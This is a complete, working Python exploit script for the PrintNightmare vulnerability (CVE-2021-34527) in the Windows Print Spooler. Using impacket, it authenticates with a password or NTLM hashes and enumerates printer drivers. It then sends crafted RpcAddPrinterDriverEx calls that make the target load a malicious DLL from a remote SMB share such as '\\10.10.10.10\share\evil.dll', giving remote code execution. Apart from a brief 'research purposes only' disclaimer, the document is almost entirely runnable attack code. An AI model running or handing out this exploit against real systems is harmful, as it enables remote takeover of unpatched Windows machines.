#!/usr/bin/env python3
"""
CVE-2021-34527 (PrintNightmare) Exploit Script

This script exploits the PrintNightmare vulnerability (CVE-2021-34527) in the Windows Print Spooler service,
enabling remote code execution by uploading a malicious DLL via printer driver routines.

- Uses impacket for DCERPC communication.
- Supports NTLM hash authentication.
- Can auto-enumerate pDriverPath if not provided.

References:
- https://github.com/afwu/PrintNightmare
- https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527

For educational and security research purposes only.
"""

import argparse
import sys
import pathlib
import re
import logging
from impacket.dcerpc.v5 import rprn
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.dtypes import NULL
from impacket.structure import Structure

# Configure logging
logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')

class DRIVER_INFO_2_BLOB(Structure):
    """
    Structure for parsing DRIVER_INFO_2 blobs received from the remote printer driver enumeration.
    """
    structure = (
        ('cVersion', '<L'),
        ('NameOffset', '<L'),
        ('EnvironmentOffset', '<L'),
        ('DriverPathOffset', '<L'),
        ('DataFileOffset', '<L'),
        ('ConfigFileOffset', '<L'),
    )

    def __init__(self, data=None):
        Structure.__init__(self, data=data)

    def fromString(self, data):
        Structure.fromString(self, data)
        self['ConfigFileArray'] = self.rawData[self['ConfigFileOffset']:self['DataFileOffset']].decode('utf-16-le')
        self['DataFileArray'] = self.rawData[self['DataFileOffset']:self['DriverPathOffset']].decode('utf-16-le')
        self['DriverPathArray'] = self.rawData[self['DriverPathOffset']:self['EnvironmentOffset']].decode('utf-16-le')
        self['EnvironmentArray'] = self.rawData[self['EnvironmentOffset']:self['NameOffset']].decode('utf-16-le')
        self['NameArray'] = self.rawData[self['NameOffset']:len(self.rawData)].decode('utf-16-le')

def connect(username, password, domain, lmhash, nthash, address, port):
    """
    Establishes an authenticated DCERPC session with the target Print Spooler service.
    Returns an authenticated DCERPC connection handle.
    """
    binding = r'ncacn_np:{0}[\PIPE\spoolss]'.format(address)
    rpctransport = transport.DCERPCTransportFactory(binding)
    rpctransport.set_dport(int(port))
    rpctransport.setRemoteHost(address)

    if hasattr(rpctransport, 'set_credentials'):
        rpctransport.set_credentials(username, password, domain, lmhash, nthash)

    logging.info(f"Connecting to {binding}")
    try:
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(rprn.MSRPC_UUID_RPRN)
    except Exception as e:
        logging.error(f"Connection failed: {e}")
        sys.exit(1)
    logging.info("DCERPC bind successful")
    return dce

def getDrivers(dce, handle=NULL):
    """
    Retrieves installed printer drivers from the target and parses the driver blob.
    Returns a parsed DRIVER_INFO_2_BLOB object.
    """
    try:
        resp = rprn.hRpcEnumPrinterDrivers(dce, pName=handle, pEnvironment="Windows x64\x00", Level=2)
        data = b''.join(resp['pDrivers'])
        blob = DRIVER_INFO_2_BLOB()
        blob.fromString(data)
        return blob
    except Exception as e:
        logging.error(f"Failed to enumerate printer drivers: {e}")
        raise

def trigger_exploit(dce, pDriverPath, share, handle=NULL):
    """
    Performs the PrintNightmare exploit by uploading the malicious DLL via crafted printer driver installation requests.
    Attempts multiple stages to maximize reliability.
    """
    container_info = rprn.DRIVER_CONTAINER()
    container_info['Level'] = 2
    container_info['DriverInfo']['tag'] = 2
    container_info['DriverInfo']['Level2']['cVersion'] = 3
    container_info['DriverInfo']['Level2']['pName'] = "1234\x00"
    container_info['DriverInfo']['Level2']['pEnvironment'] = "Windows x64\x00"
    container_info['DriverInfo']['Level2']['pDriverPath'] = pDriverPath + '\x00'
    container_info['DriverInfo']['Level2']['pDataFile'] = f"{share}\x00"
    container_info['DriverInfo']['Level2']['pConfigFile'] = "C:\\Windows\\System32\\winhttp.dll\x00"

    flags = rprn.APD_COPY_ALL_FILES | 0x10 | 0x8000
    filename = share.split("\\")[-1]

    try:
        resp = rprn.hRpcAddPrinterDriverEx(
            dce,
            pName=handle,
            pDriverContainer=container_info,
            dwFileCopyFlags=flags
        )
        logging.info(f"Stage0: ErrorCode={resp['ErrorCode']}")
    except Exception as e:
        logging.warning(f"Stage0 failed: {e}")

    container_info['DriverInfo']['Level2']['pConfigFile'] = "C:\\Windows\\System32\\kernelbase.dll\x00"
    for i in range(1, 30):
        try:
            container_info['DriverInfo']['Level2']['pConfigFile'] = (
                f"C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\{i}\\{filename}\x00"
            )
            resp = rprn.hRpcAddPrinterDriverEx(
                dce,
                pName=handle,
                pDriverContainer=container_info,
                dwFileCopyFlags=flags
            )
            logging.info(f"Stage{i}: ErrorCode={resp['ErrorCode']}")
            if resp['ErrorCode'] == 0:
                logging.info("Exploit completed successfully!")
                sys.exit(0)
        except Exception:
            continue  # Suppress errors in brute-force loop

def parse_target(target_str):
    """
    Parses the target string in the format [[domain/]username[:password]@]<targetName or address>
    Returns (domain, username, password, address)
    """
    match = re.compile(r'(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(target_str)
    domain, username, password, address = match.groups('')
    if '@' in address:
        password = password + '@' + address.rpartition('@')[0]
        address = address.rpartition('@')[2]
    return domain, username, password, address

def main():
    parser = argparse.ArgumentParser(
        add_help=True,
        description="CVE-2021-34527 (PrintNightmare) exploit. For research purposes only.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Example usage:
  python3 cve-2021-34527.py hackit.local/domain_user:Pass123@192.168.1.10 '\\\\192.168.1.215\\smb\\addCube.dll'
  python3 cve-2021-34527.py hackit.local/domain_user:Pass123@192.168.1.10 '\\\\192.168.1.215\\smb\\addCube.dll' 'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_xxxx\\Amd64\\UNIDRV.DLL'
        """
    )
    parser.add_argument('target', help="[[domain/]username[:password]@]<targetName or address>")
    parser.add_argument('share', help="Path to DLL. Example '\\\\10.10.10.10\\share\\evil.dll'")
    parser.add_argument('pDriverPath', nargs='?', default=None,
                        help="Driver path. Example 'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_xxxx\\Amd64\\UNIDRV.DLL'")
    group = parser.add_argument_group('authentication')
    group.add_argument('-hashes', metavar="LMHASH:NTHASH", help="NTLM hashes, format is LMHASH:NTHASH")
    group = parser.add_argument_group('connection')
    group.add_argument('-target-ip', metavar="ip address",
                       help="IP Address of the target machine.")
    group.add_argument('-port', choices=['139', '445'], default='445', metavar="destination port",
                       help="Destination port to connect to SMB Server (default: 445)")

    args = parser.parse_args()
    domain, username, password, address = parse_target(args.target)

    # Handle missing password prompt
    if password == '' and username != '' and args.hashes is None:
        from getpass import getpass
        password = getpass("Password:")

    # Set target_ip if not supplied
    target_ip = args.target_ip or address

    # Hash handling
    if args.hashes:
        lmhash, nthash = args.hashes.split(':')
    else:
        lmhash = nthash = ''

    dce = connect(username, password, domain or '', lmhash, nthash, target_ip, args.port)
    handle = NULL

    # Determine pDriverPath if not provided
    if not args.pDriverPath:
        try:
            blob = getDrivers(dce, handle)
            pDriverPath = str(pathlib.PureWindowsPath(blob['DriverPathArray']).parent) + '\\UNIDRV.DLL'
            if "FileRepository" not in pDriverPath:
                logging.error(f"pDriverPath {pDriverPath} is not in FileRepository; specify manually.")
                sys.exit(1)
        except Exception as e:
            logging.error(f"Failed to enumerate remote pDriverPath: {e}")
            sys.exit(1)
    else:
        pDriverPath = args.pDriverPath

    logging.info(f"Using pDriverPath: {pDriverPath}")
    logging.info(f"Attempting to execute: {args.share}")

    # Retry exploit 3 times as in original logic
    for attempt in range(1, 4):
        logging.info(f"Exploit attempt {attempt}...")
        trigger_exploit(dce, pDriverPath, args.share)

if __name__ == '__main__':
    main()
